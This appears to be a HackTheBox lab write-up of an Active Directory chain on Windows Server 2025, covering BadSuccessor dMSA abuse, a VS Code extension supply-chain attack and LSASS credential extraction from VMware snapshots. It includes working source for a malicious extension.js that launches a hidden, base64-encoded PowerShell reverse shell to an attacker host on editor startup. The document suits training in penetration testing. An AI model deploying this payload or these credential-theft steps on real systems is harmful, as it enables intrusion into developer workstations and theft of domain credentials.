HackTheBox - Active Directory

Checkpoint

A Windows Server 2025 Domain Controller chain starting from a single domain credential. The path runs through deleted AD object restoration, password reuse, or a first BadSuccessor (dMSA abuse, Windows Server 2025) run as an alternative to those recovered credentials. Write access to the DevDrop extension share then enables a VS Code supply chain attack that delivers a shell as a developer. A second BadSuccessor provides the required lateral movement to svc_deploy, whose backup access membership leads to a VM memory forensics step that extracts the Administrator hash from a nightly backup snapshot.

05 - BadSuccessor #1

BadSuccessor #1: Mark Davies

BadSuccessor (CVE-2025-29652)

Windows Server 2025 introduced Delegated Managed Service Accounts (dMSA), a new AD object type designed to gradually replace gMSAs. The succession feature lets a dMSA inherit the cryptographic keys of a previous account, providing seamless service continuity.

BadSuccessor abuses this mechanism. An attacker with CreateChild on an OU can create a dMSA and configure the succession chain to impersonate any target account. Four attributes must be set:

  • On the dMSA: msDS-ManagedAccountPrecededByLink = target account DN
  • On the dMSA: msDS-DelegatedMSAState = 2
  • On the target: msDS-SupersededManagedAccountLink = dMSA DN
  • On the target: msDS-SupersededServiceAccountState = 2

With those attributes in place, badS4U2self uses the creator's TGT to perform S4U2self toward the dMSA. The KDC treats the dMSA as a legitimate successor and includes the target account's cryptographic keys in the TGS response, including its NT hash (RC4 key).

Prerequisites for this instance alex.turner → CreateChild on OU=Employees alex.turner → WRITE on mark.davies ① alex.turner creates markdmsa3$ in OU=Employees └─ msDS-ManagedAccountPrecededByLink = CN=Mark Davies,... └─ msDS-DelegatedMSAState = 2 ② alex.turner writes to mark.davies └─ msDS-SupersededManagedAccountLink = CN=markdmsa3,... └─ msDS-SupersededServiceAccountState = 2 ③ badS4U2self (TGT alex.turner) → krbtgt for markdmsa3$ └─ KDC returns mark.davies' keys in the TGS response RC4 key = mark.davies NT hash

Password reuse already gives access to DevDrop. This BadSuccessor run on mark.davies is an alternative path to the same result: alex.turner has both the CreateChild right on OU=Employees and WRITE on mark.davies, the exact combination needed. The NT hash it produces is equivalent to the plaintext credential.

06 - Extension Supply Chain

VS Code Extension Supply Chain

What pointed us here DevDrop is an internal extension repository explicitly targeting VS Code 1.118.0. ryan.brooks is in DevTeam and uses VS Code on this machine. A malicious .vsix with activationEvents: ["*"] executes on startup with no user interaction beyond VS Code launching.

A VS Code extension package requires two files: package.json (manifest defining the engine compatibility and activation trigger) and extension.js (the code that runs on activation). The engine version ^1.118.0 matches what the share advertises, ensuring the extension is picked up without a compatibility warning.

extension.js

const cp = require("child_process");

function activate(context) {
  const ps = `
    $client = New-Object System.Net.Sockets.TCPClient('${LHOST}',${LPORT});
    $stream = $client.GetStream();
    [byte[]]$bytes = 0..65535|%{0};
    $sendbyte=([Text.Encoding]::ASCII).GetBytes('PS '+(pwd).Path+'> ');
    $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush();
    while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){
      $data=(New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);
      $sendback=(iex $data 2>&1|Out-String);
      $sendbyte=([Text.Encoding]::ASCII).GetBytes($sendback+'PS '+(pwd).Path+'> ');
      $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()
    }$client.Close()
  `;
  const enc = Buffer.from(ps,"utf16le").toString("base64");
  cp.exec("powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand "+enc,
    {windowsHide:true},()=>{});
}
function deactivate(){}
module.exports={activate,deactivate};

10 - Memory Forensics

VM Memory Forensics with VMkatz

What pointed us here VMkatz reads VMware snapshot formats and applies Mimikatz-equivalent LSASS parsing without booting the VM or touching a live system. The .vmsn suspend file is sufficient: it contains the full physical memory state of the guest.
VMkatz: LSASS extraction from a VMware snapshot

A .vmsn file (VMware suspend state) is a snapshot of the VM's complete physical memory at the moment of suspension. It contains the memory image of all running processes, including lsass.exe, which keeps active session credentials in memory: NT hashes, Kerberos keys, and sometimes cleartext passwords for WDigest sessions.

VMkatz locates LSASS structures in the snapshot file, identifies authentication providers (MSV1_0, WDigest, Kerberos, DPAPI) and extracts credentials without starting the VM or contacting a DC. The result is equivalent to running sekurlsa::logonpasswords in Mimikatz on the live machine at the time of suspension.

13 - Lessons

Key Takeaways

Concept Lesson
Deleted Objects AD's Recycle Bin preserves most attributes including ACL entries. A writable deleted object is an account waiting to be re-enabled. Check group memberships and ACLs on tombstoned objects. The permissions survive deletion.
Password reuse Restored accounts often retain their last password. Test the initial credential against re-enabled accounts before attempting more complex attacks like ASREP roasting or BadSuccessor.
BadSuccessor (Windows Server 2025) CreateChild on an OU plus WRITE on a target account is enough to extract NT hashes without password changes or interaction with the target. Requires all four succession attributes set correctly on both the dMSA and the target object.
Two-actor BadSuccessor The dMSA creator and the account with WRITE on the target do not need to be the same principal. alex.turner created the dMSA; ryan.brooks' shell wrote the succession attributes on svc_deploy. Splitting the operation across two accounts is a realistic scenario.
VS Code extension supply chain A writable internal extension repository is equivalent to code execution on every developer workstation that loads extensions from it. activationEvents: ["*"] fires immediately on VS Code startup with no user interaction required beyond opening the editor.
VM snapshot forensics Backup shares containing live VMware snapshots are high-value targets. VMkatz extracts LSASS credentials from .vmsn files without booting the VM. A single nightly backup can expose credentials for an entire environment.
BackupAccess group Service accounts tied to backup infrastructure tend to accumulate permissions that span the entire environment. The group name in LDAP directly communicated the path to the VMBackups data.
